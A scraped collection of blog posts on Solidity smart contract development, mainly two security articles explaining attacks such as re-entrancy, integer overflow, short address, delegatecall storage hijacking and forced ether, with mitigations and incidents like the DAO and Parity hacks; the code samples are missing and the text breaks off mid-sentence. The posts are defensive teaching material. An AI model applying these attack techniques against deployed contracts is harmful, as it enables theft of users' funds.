"author_name": "Georgios Konstantopoulos", "link": "https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834?source=search_post", "post_date": "Jan 16, 2018", "readtime": "5 min read", "upvotes": "1.1K", "content": "How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part\u00a02)Georgios KonstantopoulosBlockedUnblockFollowFollowingJan 16, 2018While Part 1 discussed some more high profile or obvious vulnerabilities, this post will be about vulnerabilities that have not been exploited widely yet.Let\u2019s skip the introduction and jump straight to them:4. Forcing ether to a\u00a0contractSolidity\u2019s selfdestruct does two things.It renders the contract useless, effectively deleting the bytecode at that address.It sends all the contract\u2019s funds to a target address.The special case here, is that if the receiving address is a contract, its fallback function does not get executed.This means that if a contract\u2019s function has a conditional statement that depends on that contract\u2019s balance being below a certain amount, that statement can be potentially bypassed:Due to the throwing fallback function, normally the contract cannot receive ether. However, if a contract selfdestructs with this contract as a target, the fallback function does not get called. As a result this.balance becomes greater than 0, and thus the attacker can bypass the require statement in onlyNonZeroBalanceMitigation: Never use a contract\u2019s balance as a guard.5. Call to the Unknown (DoS with unexpected revert)This vulnerability appeared in the King of the Ether smart contract.In this case, an attacker\u2019s contract could first claim leadership by sending enough ether to the insecure contract. Then, the transactions of another player who would attempt to claim leadership would throw due to line 25 in the above snippet.Although a simple attack, this causes a permanent denial of service to the contract rendering it useless. This can be found in other ponzi scheme contracts that follow the same pattern.6. Short Address\u00a0AttackThis attack was discovered by the Golem team and described in this article. This vulnerability allows an attacker to abuse the transfer function and withdraw a larger amount of ERC20 tokens than he is allowed to.Note: For simplicity we\u2019ll use words half the normal size.To explain this bug let\u2019s consider an exchange having a wallet with 10000 tokens and a user with a balance of 32 tokens on that exchange\u2019s wallet. Let\u2019s also consider that this user\u2019s address is0x12345600\u200a\u2014\u200anotice the trailing zeroes\u200a\u2014\u200aand that they want to withdraw an amount larger than their balance. To do that they would go to the exchange and click the token\u2019s withdraw button and input their address without the trailing zeroes (the exchange does not perform input validation and allows the transaction to go through, even though the attacker\u2019s address length is invalid).Then, the EVM calculates the input data for the transaction to be executed by concatenating the function\u2019s signature and the arguments.The ERC20\u2019s transfer function is formulated as transfer(address to, uint256 amount). The 3 fields would be as follows:sig : a9059cbb = web3.sha3(\"transfer(address,uint256)\").slice(0,10)arg1: 123456   = receiving addressarg2: 00000020  = 32 in hexademical (0x20)----------------------------------------Concatenated: a9059cbb 123456 00000020Transaction input data: 0xa9059cbb12345600000020The vulnerabilityLooking closely, the transaction\u2019s length is 2 bytes shorter (4 bytes in the real world with full words). The EVM in this case would pad the transaction with trailing zeroes, resulting in:0xa9059cbb1234560000002000// a9059cbb = web3.sha3(\"transfer(address,uint256)\").slice(0,10)// 12345600   = receiving address// 00002000  = 8192 in hexademical (0x2000 == 0x20<<8)That way, even though the attacker\u2019s balance according to the exchange is 32 tokens, they are able to execute a perfectly legitimate transfer for an amount that is much larger. This of course relies on the fact that the sending account (the exchange\u2019s wallet) has enough balance for the transfer.Mitigations:Throw if msg.data has invalid sizeExchanges must perform input validationReddit comment describing validating msg.data sizeBonus:ALWAYS avoid the use of now and block.blockhash for your contract\u2019s business logic as their results are predictable or can be manipulated by miners. More on that here.", "responses": "3"}, {"title": "Let\u2019s Build Your First Smart Contract in Solidity and\u00a0Truffle", "author_name": "Amazingandyyy", "link": "https://medium.com/etherereum-salon/hello-ethereum-solan-contract-4643118a6119?source=search_post", "post_date": "Jul 30, 2017", "readtime": "6 min read", "upvotes": "872", "content": "Let\u2019s Build Your First Smart Contract in Solidity and\u00a0TruffleAmazingandyyyBlockedUnblockFollowFollowingJul 30, 2017Everyone is talking about Blockchain/Ethereum/Smart Contracts, and the price of Ether just went up and down. In my opinion, to know the value of ether and to take the advantage of this Blockchain Technology, getting hands on and diving into the smart contract development is the best and most effective way. I hope this series of tutorials will inspire you and lead you to start learning and applying smart contracts.After this extremely short tutorials, you can tell people,I just build my first smart contract this morning! [plus learned to\u00a0debug]In this first tutorial, you will learn writing solidity language and truffle CLI tool to write and deploy a hello-world contract in a reasonably short amount of time.All resources are available in my GitHub repo as following.amazingandyyy/the-good-ethereum-smart-contract-tutorialthe-good-ethereum-smart-contract-tutorial - Repo for The Complete Ethereum Smart Contract Development tutorials series.github.com", "responses": "7"}, {"title": "Solidity tutorial: returning structs from public functions", "author_name": "Bryn Bellomy", "link": "https://medium.com/coinmonks/solidity-tutorial-returning-structs-from-public-functions-e78e48efb378?source=search_post", "post_date": "Jul 11, 2017", "readtime": "3 min read", "upvotes": "1K", "content": "Solidity tutorial: returning structs from public functionsBryn BellomyBlockedUnblockFollowFollowingJul 11, 2017In the current version of Solidity (0.4.13, as of this writing), it\u2019s impossible to return a struct from a public function. For example, if you attempt to compile the following code, you will get two errors, one for each function that tries to do so:You can open this Gist in browser-solidity with the following link: http://ethereum.github.io/browser-solidity/#gist=03f9e536d033f81fe2a2df7a74a17ddf&version=soljson-v0.4.13+commit.fb4cb1a.jsAs you\u2019ll see, the compiler complains about both functions, getBryn and getPerson:TypeError: Internal type is not allowed for public or external functions.Confirmed, it\u2019s impossible to return structs.However, if you\u2019ve been coding in Solidity for a while, you might notice that the following works perfectly well:Because the mapping is public, Solidity automatically generates a getter for this function. That\u2019s odd, because the getter would have to return a Person struct, right? Let\u2019s dig in a little bit deeper.Let\u2019s deploy the above contract and run the following Javascript code:Okay, so what\u2019s going on here?Shouldn\u2019t the compiler complain when we ask it to generate a getter for a mapping that returns a Person struct?As it turns out, solc is smart enough to handle this case for us. Notice the return value from the invocation of project.people('0xdeadbeef'). It\u2019s an array, which is how Solidity tuples are returned to Javascript land. Alright, so we know that the getter is not returning a struct, per se, but rather a tuple. This is a big clue!When the compiler generates a getter for a mapping or an array where the element is a struct, it does something like the following:As you can see, the getter simply breaks the struct down into a tuple. No internal types (like structs) are exposed. As a result, we get the functionality we desired with no compiler error. We simply have to be careful about the ordering of struct fields\u2014if the order changes, we\u2019ll have to change any code that interacts with this getter, since the order of the tuple values will change as well.Knowing this, we can take a cue from Solidity\u2019s implementation of this mapping getter when writing our own functions that return structs.Returning arrays of\u00a0structsSometimes we might need to return an array of structs to the caller. However, if we take the na\u00efve approach, we\u2019ll once again run into the same limitation\u2014we can\u2019t expose internal types.We learned above that we can \u201cdestructure\u201d a struct and return it as a tuple. To return an array of structs, we will do the same thing. Each value in the returned tuple will represent a field in the struct. But because we\u2019re trying to return many structs (and therefore, many values for each field), each field in the tuple will be an array.Check out the following code to get a better sense of how this might look:Getting data back in this format is, admittedly, a pain to deal with on the frontend. Depending on your frontend data model, you may very well have to write functions to \u201crebuild\u201d these structs from the data you receive. I\u2019ve thrown together a quick example to show you how you might go about doing that:", "responses": "6"}, {"title": "HackPedia: 16 Solidity Hacks/Vulnerabilities, their Fixes and Real World\u00a0Examples", "author_name": "vasa", "link": "https://hackernoon.com/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148?source=search_post", "post_date": "Jul 22, 2018", "readtime": "53 min read", "upvotes": "1.2K", "content": "HackPedia: 16 Solidity Hacks/Vulnerabilities, their Fixes and Real World\u00a0ExamplesA Complete List of all Solidity Hacks/Vulnerabilities, their Fixes and Real World Hack\u00a0ExamplesvasaBlockedUnblockFollowFollowingJul 22, 2018This blog was written by Dr. Adrian Manning in this SigmaPrime Blog.Although in its infancy, Solidity has had widespread adoption and is used to compile the byte-code in many Ethereum smart contracts we see today. There have been a number of harsh lessons learned by developers and users alike in discovering the nuances of the language and the EVM. This post aims to be a relatively in-depth and up-to-date introductory post detailing the past mistakes that have been made by Solidity developers in an effort to prevent future devs from repeating history.Here are 16 interesting hacks:1. Re-EntrancyOne of the features of Ethereum smart contracts is the ability to call and utilise code of other external contracts. Contracts also typically handle ether, and as such often send ether to various external user addresses. The operation of calling external contracts, or sending ether to an address, requires the contract to submit an external call. These external calls can be hijacked by attackers whereby they force the contract to execute further code (i.e. through a fallback function)\u00a0, including calls back into itself. Thus the code execution \u201cre-enters\u201d the contract. Attacks of this kind were used in the infamous DAO hack.For further reading on re-entrancy attacks, see Reentrancy Attack On Smart Contracts and Consensus\u200a\u2014\u200aEthereum Smart Contract Best Practices.The VulnerabilityThis attack can occur when a contract sends ether to an unknown address. An attacker can carefully construct a contract at an external address which contains malicious code in the fallback function. Thus, when a contract sends ether to this address, it will invoke the malicious code. Typically the malicious code executes a function on the vulnerable contract, performing operations not expected by the developer. The name \u201cre-entrancy\u201d comes from the fact that the external malicious contract calls back a function on the vulnerable contract and \u201cre-enters\u201d code execution at an arbitrary location on the vulnerable contract.To clarify this, consider the simple vulnerable contract, which acts as an Ethereum vault that allows depositors to only withdraw 1 ether per week.EtherStore.solThis contract has two public functions. depositFunds() and withdrawFunds(). The depositFunds() function simply increments the senders balances. The withdrawFunds() function allows the sender to specify the amount of wei to withdraw. It will only succeed if the requested amount to withdraw is less than 1 ether and a withdrawal hasn't occurred in the last week. Or does it?...The vulnerability comes on line [17] where we send the user their requested amount of ether. Consider a malicious attacker creating the following contract,Attack.solLet us see how this malicious contract can exploit our EtherStore contract. The attacker would create the above contract (let's say at the address 0x0...123) with the EtherStore's contract address as the constructor parameter. This will initialize and point the public variable etherStore to the contract we wish to attack.The attacker would then call the pwnEtherStore() function, with some amount of ether (greater than or equal to 1), lets say 1 ether for this example. In this example we assume a number of other users have deposited ether into this contract, such that it's current balance is 10 ether. The following would then occur:Attack.sol\u200a\u2014\u200aLine [15]\u200a\u2014\u200aThe depositFunds() function of the EtherStore contract will be called with a msg.value of 1 ether (and a lot of gas). The sender (msg.sender) will be our malicious contract (0x0...123). Thus, balances[0x0..123] = 1 ether.Attack.sol\u200a\u2014\u200aLine [17]\u200a\u2014\u200aThe malicious contract will then call the withdrawFunds() function of the EtherStore contract with a parameter of 1 ether. This will pass all the requirements (Lines [12]-[16] of the EtherStore contract) as we have made no previous withdrawals.EtherStore.sol\u200a\u2014\u200aLine [17]\u200a\u2014\u200aThe contract will then send 1 ether back to the malicious contract.Attack.sol\u200a\u2014\u200aLine [25]\u200a\u2014\u200aThe ether sent to the malicious contract will then execute the fallback function.Attack.sol\u200a\u2014\u200aLine [26]\u200a\u2014\u200aThe total balance of the EtherStore contract was 10 ether and is now 9 ether so this if statement passes.Attack.sol\u200a\u2014\u200aLine [27]\u200a\u2014\u200aThe fallback function then calls the EtherStore withdrawFunds() function again and \"re-enters\" the EtherStore contract.EtherStore.sol\u200a\u2014\u200aLine [11]\u200a\u2014\u200aIn this second call to withdrawFunds(), our balance is still 1 ether as line [18] has not yet been executed. Thus, we still have balances[0x0..123] = 1 ether. This is also the case for the lastWithdrawTimevariable. Again, we pass all the requirements.EtherStore.sol\u200a\u2014\u200aLine [17]\u200a\u2014\u200aWe withdraw another 1 ether.Steps 4\u20138 will repeat\u200a\u2014\u200auntil EtherStore.balance >= 1 as dictated by line [26] in Attack.sol.Attack.sol\u200a\u2014\u200aLine [26]\u200a\u2014\u200aOnce there less 1 (or less) ether left in the EtherStore contract, this if statement will fail. This will then allow lines [18] and [19] of the EtherStore contract to be executed (for each call to the withdrawFunds() function).EtherStore.sol\u200a\u2014\u200aLines [18] and [19]\u200a\u2014\u200aThe balances and lastWithdrawTime mappings will be set and the execution will end.The final result, is that the attacker has withdrawn all (bar 1) ether from the EtherStore contract, instantaneously with a single transaction.Preventative TechniquesThere are a number of common techniques which help avoid potential re-entrancy vulnerabilities in smart contracts. The first is to ( whenever possible) use the built-in transfer() function when sending ether to external contracts. The transfer function only sends 2300 gas which isn't enough for the destination address/contract to call another contract (i.e. re-enter the sending contract).The second technique is to ensure that all logic that changes state variables happen before ether is sent out of the contract (or any external call). In the EtherStore example, lines [18] and [19] of EtherStore.sol should be put before line [17]. It is good practice to place any code that performs external calls to unknown addresses as the last operation in a localised function or piece of code execution. This is known as the checks-effects-interactions pattern.A third technique is to introduce a mutex. That is, to add a state variable which locks the contract during code execution, preventing reentrancy calls.Applying all of these techniques (all three are unnecessary, but is done for demonstrative purposes) to EtherStore.sol, gives the re-entrancy-free contract:Real-World Example: The\u00a0DAOThe DAO (Decentralized Autonomous Organization) was one of the major hacks that occurred in the early development of Ethereum. At the time, the contract held over $150 million USD. Re-entrancy played a major role in the attack which ultimately lead to the hard-fork that created Ethereum Classic (ETC). For a good analysis of the DAO exploit, see Phil Daian\u2019s post.2. Arithmetic Over/Under FlowsThe Ethereum Virtual Machine (EVM) specifies fixed-size data types for integers. This means that an integer variable, only has a certain range of numbers it can represent. A uint8 for example, can only store numbers in the range [0,255]. Trying to store 256 into a uint8 will result in 0. If care is not taken, variables in Solidity can be exploited if user input is unchecked and calculations are performed which result in numbers that lie outside the range of the data type that stores them.For further reading on arithmetic over/under flows, see How to Secure Your Smart Contracts, Ethereum Smart Contract Best Practices and Ethereum, Solidity and integer overflows: programming blockchains like 1970The VulnerabilityAn over/under flow occurs when an operation is performed that requires a fixed size variable to store a number (or piece of data) that is outside the range of the variable\u2019s data type.For example, subtracting 1 from a uint8 (unsigned integer of 8 bits, i.e. only positive) variable that stores 0 as it's value, will result in the number 255. This is an underflow. We have assigned a number below the range of the uint8, the result wraps around and gives the largest number a uint8 can store. Similarly, adding 2^8=256 to a uint8 will leave the variable unchanged as we have wrapped around the entire length of the uint (for the mathematicians, this is similar to adding $2\\pi$ to the angle of a trigonometric function, $\\sin(x) = \\sin(x+2\\pi)$). Adding numbers larger than the data type's range is called an overflow. For clarity, adding 257 to a uint8 that currently has a zero value will result in the number 1. It's sometimes instructive to think of fixed type variables being cyclic, where we start again from zero if we add numbers above the largest possible stored number, and vice-versa for zero (where we start counting down from the largest number the more we subtract from 0).These kinds of vulnerabilities allow attackers to misuse code and create unexpected logic flows. For example, consider the time locking contract below.TimeLock.solThis contract is designed to act like a time vault, where users can deposit ether into the contract and it will be locked there for at least a week. The user may extend the time longer than 1 week if they choose, but once deposited, the user can be sure their ether is locked in safely for at least a week. Or can they?\u2026In the event a user is forced to hand over their private key (think hostage situation) a contract such as this may be handy to ensure ether is unobtainable in short periods of time. If a user had locked in 100 ether in this contract and handed their keys over to an attacker, an attacker could use an overflow to receive the ether, regardless of the lockTime.The attacker could determine the current lockTime for the address they now hold the key for (its a public variable). Let's call this userLockTime. They could then call the increaseLockTime function and pass as an argument the number 2^256 - userLockTime. This number would be added to the current userLockTime and cause an overflow, resetting lockTime[msg.sender] to 0. The attacker could then simply call the withdraw function to obtain their reward.Let\u2019s look at another example, this one from the Ethernaut Challanges.SPOILER ALERT: If you\u2019ve not yet done the Ethernaut challenges, this gives a solution to one of the levels.This is a simple token contract which employs a transfer() function, allowing participants to move their tokens around. Can you see the error in this contract?The flaw comes in the transfer() function. The require statement on line [13] can be bypassed using an underflow. Consider a user that has no balance. They could call the transfer() function with any non-zero _value and pass the require statement on line [13]. This is because balances[msg.sender] is zero (and a uint256) so subtracting any positive amount (excluding 2^256) will result in a positive number due to the underflow we described above. This is also true for line [14], where our balance will be credited with a positive number. Thus, in this example, we have achieved free tokens due to an underflow vulnerability.Preventative TechniquesThe (currently) conventional technique to guard against under/overflow vulnerabilities is to use or build mathematical libraries which replace the standard math operators; addition, subtraction and multiplication (division is excluded as it doesn\u2019t cause over/under flows and the EVM throws on division by 0).OppenZepplin have done a great job in building and auditing secure libraries which can be leveraged by the Ethereum community. In particular, their Safe Math Library is a reference or library to use to avoid under/over flow vulnerabilities.To demonstrate how these libraries are used in Solidity, let us correct the TimeLock contract, using Open Zepplin's SafeMathlibrary. The over flow-free contract would become:Notice that all standard math operations have been replaced by the those defined in the SafeMath library. The TimeLockcontract no longer performs any operation which is capable of doing an under/over flow.Real-World Examples: PoWHC and Batch Transfer Overflow (CVE-2018\u201310299)A 4chan group decided it was a great idea to build a ponzi scheme on Ethereum, written in Solidity. They called it the Proof of Weak Hands Coin (PoWHC). Unfortunately it seems that the author(s) of the contract hadn\u2019t seen over/under flows before and consequently, 866 ether was liberated from its contract. A good overview of how the underflow occurs (which is not too dissimilar to the Ethernaut challenge above) is given in Eric Banisadar\u2019s post.Some developers also implemented a batchTransfer() function into some ERC20 token contracts. The implementation contained an overflow. This post explains it, however I think the title is misleading, in that it has nothing to do with the ERC20 standard, rather some ERC20 token contracts have a vulnerable batchTransfer() function implemented.3. Unexpected EtherTypically when ether is sent to a contract, it must execute either the fallback function, or another function described in the contract. There are two exceptions to this, where ether can exist in a contract without having executed any code. Contracts which rely on code execution for every ether sent to the contract can be vulnerable to attacks where ether is forcibly sent to a contract.For further reading on this, see How to Secure Your Smart Contracts: 6 and Solidity security patterns\u200a\u2014\u200aforcing ether to a contract\u00a0.The VulnerabilityA common defensive programming technique that is useful in enforcing correct state transitions or validating operations is invariant-checking. This technique involves defining a set of invariants (metrics or parameters that should not change) and checking these invariants remain unchanged after a single (or many) operation(s). This is typically good design, provided the invariants being checked are in fact invariants. One example of an invariant is the totalSupply of a fixed issuance ERC20token. As no functions should modify this invariant, one could add a check to the transfer() function that ensures the totalSupply remains unmodified to ensure the function is working as expected.There is one apparent \u201cinvariant\u201d, in particular, that may tempt developers to use, but can in fact be manipulated by external users, regardless of the rules put in place in the smart contract. This is the current ether stored in the contract. Often, when developers first learn Solidity, they have the misconception that a contract can only accept or obtain ether via payable functions. This misconception can lead to contracts that have false assumptions about the ether balance within them which can lead to a range of vulnerabilities. The smoking gun for this vulnerability is the (incorrect) use of this.balance. As we will see, incorrect uses of this.balance can lead to serious vulnerabilities of this type.There are two ways in which ether can (forcibly) be sent to a contract without using a payable function or executing any code on the contract. These are listed below.Self Destruct /\u00a0SuicideAny contract is able to implement the selfdestruct(address) function, which removes all bytecode from the contract address and sends all ether stored there to the parameter-specified address. If this specified address is also a contract, no functions (including the fallback) get called. Therefore, the selfdestruct() function can be used to forcibly send ether to any contract regardless of any code that may exist in the contract. This is inclusive of contracts without any payable functions. This means, any attacker can create a contract with a selfdestruct() function, send ether to it, call selfdestruct(target) and force ether to be sent to a target contract. Martin Swende has an excellent blog post describing some quirks of the self-destruct opcode (Quirk #2) along with a description of how client nodes were checking incorrect invariants which could have lead to a rather catastrophic nuking of clients.Pre-sent EtherThe second way a contract can obtain ether without using a selfdestruct() function or calling any payable functions is to pre-load the contract address with ether. Contract addresses are deterministic, in fact the address is calculated from the hash of the address creating the contract and the transaction nonce which creates the contract. i.e. of the form: address = sha3(rlp.encode([account_address,transaction_nonce])) (see Keyless Ether for some fun use cases of this). This means, anyone can calculate what a contract address will be before it is created and thus send ether to that address. When the contract does get created it will have a non-zero ether balance.Let\u2019s explore some pitfalls that can arise given the above knowledge.Consider the overly-simple contract,EtherGame.solThis contract represents a simple game (which would naturally invoke race-conditions) whereby players send 0.5 etherquanta to the contract in hope to be the player that reaches one of three milestones first. Milestone's are denominated in ether. The first to reach the milestone may claim a portion of the ether when the game has ended. The game ends when the final milestone (10 ether) is reached and users can claim their rewards.The issues with the EtherGame contract come from the poor use of this.balance in both lines [14] (and by association [16]) and [32]. A mischievous attacker could forcibly send a small amount of ether, let's say 0.1 ether via the selfdestruct()function (discussed above) to prevent any future players from reaching a milestone. As all legitimate players can only send 0.5 ether increments, this.balance would no longer be half integer numbers, as it would also have the 0.1 ethercontribution. This prevents all the if conditions on lines [18], [21] and [24] from being true.Even worse, a vengeful attacker who missed a milestone, could forcibly send 10 ether (or an equivalent amount of ether that pushes the contract's balance above the finalMileStone) which would lock all rewards in the contract forever. This is because the claimReward() function will always revert, due to the require on line [32] (i.e. this.balance is greater than finalMileStone).Preventative TechniquesThis vulnerability typically arises from the misuse of this.balance. Contract logic, when possible, should avoid being dependent on exact values of the balance of the contract because it can be artificially manipulated. If applying logic based on this.balance, ensure to account for unexpected balances.If exact values of deposited ether are required, a self-defined variable should be used that gets incremented in payable functions, to safely track the deposited ether. This variable will not be influenced by the forced ether sent via a selfdestruct() call.With this in mind, a corrected version of the EtherGame contract could look like:Here, we have just created a new variable, depositedEther which keeps track of the known ether deposited, and it is this variable to which we perform our requirements and tests. Notice, that we no longer have any reference to this.balance.Real-World Example:\u00a0UnknownI\u2019m yet to find and example of this that has been exploited in the wild. However, a few examples of exploitable contracts were given in the Underhanded Solidity Contest.4. DelegatecallThe CALL and DELEGATECALL opcodes are useful in allowing Ethereum developers to modularise their code. Standard external message calls to contracts are handled by the CALL opcode whereby code is run in the context of the external contract/function. The DELEGATECALL opcode is identical to the standard message call, except that the code executed at the targeted address is run in the context of the calling contract along with the fact that msg.sender and msg.value remain unchanged. This feature enables the implementation of libraries whereby developers can create reusable code for future contracts.Although the differences between these two opcodes are simple and intuitive, the use of DELEGATECALL can lead to unexpected code execution.For further reading, see Ethereum Stack Exchange Question, Solidity Docs and How to Secure Your Smart Contracts: 6.The VulnerabilityThe context preserving nature of DELEGATECALL has proved that building vulnerability-free custom libraries is not as easy as one might think. The code in libraries themselves can be secure and vulnerability-free however when run in the context of another application new vulnerabilities can arise. Let's see a fairly complex example of this, using Fibonacci numbers.Consider the following library which can generate the Fibonacci sequence and sequences of similar form.FibonacciLib.sol (This code was modified from web3j)This library provides a function which can generate the n-th Fibonacci number in the sequence. It allows users to change the 0-th start number and calculate the n-th Fibonacci-like numbers in this new sequence.Let\u2019s now consider a contract that utilises this library.FibonacciBalance.solThis contract allows a participant to withdraw ether from the contract, with the amount of ether being equal to the Fibonacci number corresponding to the participants withdrawal order; i.e., the first participant gets 1 ether, the second also gets 1, the third gets 2, the forth gets 3, the fifth 5 and so on (until the balance of the contract is less than the Fibonacci number being withdrawn).There are a number of elements in this contract that may require some explanation. Firstly, there is an interesting-looking variable, fibSig. This holds the first 4 bytes of the Keccak (SHA-3) hash of the string \"fibonacci(uint256)\". This is known as the function selector and is put into calldata to specify which function of a smart contract will be called. It is used in the delegatecall function on line [21] to specify that we wish to run the fibonacci(uint256) function. The second argument in delegatecall is the parameter we are passing to the function. Secondly, we assume that the address for the FibonacciLiblibrary is correctly referenced in the constructor (section Deployment Attack Vectors discuss some potential vulnerabilities relating to this kind if contract reference initialisation).Can you spot any error(s) in this contract? If you put this into remix, fill it with ether and call withdraw(), it will likely revert.You may have noticed that the state variable start is used in both the library and the main calling contract. In the library contract, start is used to specify the beginning of the Fibonacci sequence and is set to 0, whereas it is set to 3 in the FibonacciBalance contract. You may also have noticed that the fallback function in the FibonacciBalance contract allows all calls to be passed to the library contract, which allows for the setStart() function of the library contract to be called also. Recalling that we preserve the state of the contract, it may seem that this function would allow you to change the state of the start variable in the local FibonnacciBalance contract. If so, this would allow one to withdraw more ether, as the resulting calculatedFibNumber is dependent on the start variable (as seen in the library contract). In actual fact, the setStart()function does not (and cannot) modify the start variable in the FibonacciBalance contract. The underlying vulnerability in this contract is significantly worse than just modifying the start variable.Before discussing the actual issue, we take a quick detour to understanding how state variables (storage variables) actually get stored in contracts. State or storage variables (variables that persist over individual transactions) are placed into slotssequentially as they are introduced in the contract. (There are some complexities here, and I encourage the reader to read Layout of State Variables in Storage for a more thorough understanding).As an example, let\u2019s look at the library contract. It has two state variables, start and calculatedFibNumber. The first variable is start, as such it gets stored into the contract's storage at slot[0] (i.e. the first slot). The second variable, calculatedFibNumber, gets placed in the next available storage slot, slot[1]. If we look at the function setStart(), it takes an input and sets start to whatever the input was. This function is therefore setting slot[0] to whatever input we provide in the setStart() function. Similarly, the setFibonacci() function sets calculatedFibNumber to the result of fibonacci(n). Again, this is simply setting storage slot[1] to the value of fibonacci(n).Now lets look at the FibonacciBalance contract. Storage slot[0] now corresponds to fibonacciLibrary address and slot[1] corresponds to calculatedFibNumber. It is here where the vulnerability appears. delegatecall preserves contract context. This means that code that is executed via delegatecall will act on the state (i.e. storage) of the calling contract.Now notice that in withdraw() on line [21] we execute, fibonacciLibrary.delegatecall(fibSig,withdrawalCounter). This calls the setFibonacci() function, which as we discussed, modifies storage slot[1], which in our current context is calculatedFibNumber. This is as expected (i.e. after execution, calculatedFibNumber gets adjusted). However, recall that the start variable in the FibonacciLib contract is located in storage slot[0], which is the fibonacciLibrary address in the current contract. This means that the function fibonacci() will give an unexpected result. This is because it references start (slot[0]) which in the current calling context is the fibonacciLibrary address (which will often be quite large, when interpreted as a uint). Thus it is likely that the withdraw() function will revert as it will not contain uint(fibonacciLibrary) amount of ether, which is what calcultedFibNumber will return.Even worse, the FibonacciBalance contract allows users to call all of the fibonacciLibrary functions via the fallback function on line [26]. As we discussed earlier, this includes the setStart() function. We discussed that this function allows anyone to modify or set storage slot[0]. In this case, storage slot[0] is the fibonacciLibrary address. Therefore, an attacker could create a malicious contract (an example of one is below), convert the address to a uint (this can be done in python easily using int('<address>',16)) and then call setStart(<attack_contract_address_as_uint>). This will change fibonacciLibrary to the address of the attack contract. Then, whenever a user calls withdraw() or the fallback function, the malicious contract will run (which can steal the entire balance of the contract) because we've modified the actual address for fibonacciLibrary. An example of such an attack contract would be,Notice that this attack contract modifies the calculatedFibNumber by changing storage slot[1]. In principle, an attacker could modify any other storage slots they choose to perform all kinds of attacks on this contract. I encourage all readers to put these contracts into Remix and experiment with different attack contracts and state changes through these delegatecallfunctions.It is also important to notice that when we say that delegatecall is state-preserving, we are not talking about the variable names of the contract, rather the actual storage slots to which those names point. As you can see from this example, a simple mistake, can lead to an attacker hijacking the entire contract and its ether.Preventative TechniquesSolidity provides the library keyword for implementing library contracts (see the Solidity Docs for further details). This ensures the library contract is stateless and non-self-destructable. Forcing libraries to be stateless mitigates the complexities of storage context demonstrated in this section. Stateless libraries also prevent attacks whereby attackers modify the state of the library directly in order to effect the contracts that depend on the library's code. As a general rule of thumb, when using DELEGATECALL pay careful attention to the possible calling context of both the library contract and the calling contract, and whenever possible, build state-less libraries.Real-World Example: Parity Multisig Wallet (Second\u00a0Hack)The Second Parity Multisig Wallet hack is an example of how the context of well-written library code can be exploited if run in its non-intended context. There are a number of good explanations of this hack, such as this overview: Parity MultiSig Hacked. Again by Anthony Akentiev, this stack exchange question and An In-Depth Look at the Parity Multisig Bug.To add to these references, let\u2019s explore the contracts that were exploited. The library and wallet contract can be found on the parity github here.Let\u2019s look at the relevant aspects of this contract. There are two contracts of interest contained here, the library contract and the wallet contract.The library contract,and the wallet contract,Notice that the Wallet contract essentially passes all calls to the WalletLibrary contract via a delegate call. The constant _walletLibrary address in this code snippet acts as a placeholder for the actually deployed WalletLibrary contract (which was at 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4).The intended operation of these contracts was to have a simple low-cost deployable Wallet contract whose code base and main functionality was in the WalletLibrary contract. Unfortunately, the WalletLibrary contract is itself a contract and maintains it's own state. Can you see why this might be an issue?It is possible to send calls to the WalletLibrary contract itself. Specifically, the WalletLibrary contract could be initialised, and become owned. A user did this, by calling initWallet() function on the WalletLibrary contract, becoming an owner of the library contract. The same user, subsequently called the kill() function. Because the user was an owner of the Library contract, the modifier passed and the library contract suicided. As all Wallet contracts in existence refer to this library contract and contain no method to change this reference, all of their functionality, including the ability to withdraw ether is lost along with the WalletLibrary contract. More directly, all ether in all parity multi-sig wallets of this type instantly become lost or permanently unrecoverable.5. Default VisibilitiesFunctions in Solidity have visibility specifiers which dictate how functions are allowed to be called. The visibility determines whether a function can be called externally by users, by other derived contracts, only internally or only externally. There are four visibility specifiers, which are described in detail in the Solidity Docs. Functions default to public allowing users to call them externally. Incorrect use of visibility specifiers can lead to some devestating vulernabilities in smart contracts as will be discussed in this section.The VulnerabilityThe default visibility for functions is public. Therefore functions that do not specify any visibility will be callable by external users. The issue comes when developers mistakenly ignore visibility specifiers on functions which should be private (or only callable within the contract itself).Lets quickly explore a trivial example.This simple contract is designed to act as an address guessing bounty game. To win the balance of the contract, a user must generate an Ethereum address whose last 8 hex characters are 0. Once obtained, they can call the WithdrawWinnings()function to obtain their bounty.Unfortunately, the visibility of the functions have not been specified. In particular, the _sendWinnings() function is publicand thus any address can call this function to steal the bounty.Preventative TechniquesIt is good practice to always specify the visibility of all functions in a contract, even if they are intentionally public. Recent versions of Solidity will now show warnings during compilation for functions that have no explicit visibility set, to help encourage this practice.Real-World Example: Parity MultiSig Wallet (First\u00a0Hack)In the first Parity multi-sig hack, about $31M worth of Ether was stolen from primarily three wallets. A good recap of exactly how this was done is given by Haseeb Qureshi in this post.Essentially, the multi-sig wallet (which can be found here) is constructed from a base Wallet contract which calls a library contract containing the core functionality (as was described in Real-World Example: Parity Multisig (Second Hack)). The library contract contains the code to initialise the wallet as can be seen from the following snippetNotice that neither of the functions have explicitly specified a visibility. Both functions default to public. The initWallet()function is called in the wallets constructor and sets the owners for the multi-sig wallet as can be seen in the initMultiowned() function. Because these functions were accidentally left public, an attacker was able to call these functions on deployed contracts, resetting the ownership to the attackers address. Being the owner, the attacker then drained the wallets of all their ether, to the tune of $31M.6. Entropy\u00a0IllusionAll transactions on the Ethereum blockchain are deterministic state transition operations. Meaning that every transaction modifies the global state of the Ethereum ecosystem and it does so in a calculable way with no uncertainty. This ultimately means that inside the blockchain ecosystem there is no source of entropy or randomness. There is no rand() function in Solidity. Achieving decentralised entropy (randomness) is a well established problem and many ideas have been proposed to address this (see for example, RandDAO or using a chain of Hashes as described by Vitalik in this post).The VulnerabilitySome of the first contracts built on the Ethereum platform were based around gambling. Fundamentally, gambling requires uncertainty (something to bet on), which makes building a gambling system on the blockchain (a deterministic system) rather difficult. It is clear that the uncertainty must come from a source external to the blockchain. This is possible for bets amongst peers (see for example the commit-reveal technique), however, it is significantly more difficult if you want to implement a contract to act as the house (like in blackjack our roulette). A common pitfall is to use future block variables, such as hashes, timestamps, blocknumber or gas limit. The issue with these are that they are controlled by the miner who mines the block and as such are not truly random. Consider, for example, a roulette smart contract with logic that returns a black number if the next block hash ends in an even number. A miner (or miner pool) could bet \\$1M on black. If they solve the next block and find the hash ends in an odd number, they would happily not 